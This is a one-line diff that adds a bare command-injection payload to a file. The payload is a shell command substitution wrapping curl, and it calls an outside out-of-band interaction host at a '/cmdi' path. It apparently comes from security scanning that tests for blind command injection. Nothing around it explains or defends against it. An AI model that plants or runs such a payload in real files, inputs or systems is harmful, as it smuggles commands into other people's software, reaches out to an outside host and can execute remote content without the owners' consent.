@@ -1,0 +1,1 @@
+$(curl http://oob00e371b50d38.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/cmdi)
